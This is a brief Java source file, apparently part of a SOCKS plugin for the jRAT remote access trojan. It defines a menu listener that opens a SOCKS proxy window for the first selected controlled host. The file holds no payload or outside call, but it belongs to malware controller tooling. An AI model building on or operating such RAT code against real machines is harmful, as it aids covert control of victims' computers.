package se.jrat.plugin.socks.client;

import java.util.List;

import jrat.api.RATMenuItemActionListener;
import jrat.api.RATObject;

public class MenuListener implements RATMenuItemActionListener {

	@Override
	public void onClick(List<RATObject> servers) {
		try {
			if (servers.size() > 0) {
				final RATObject server = servers.get(0);		
				new FrameSocks(server).setVisible(true);
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
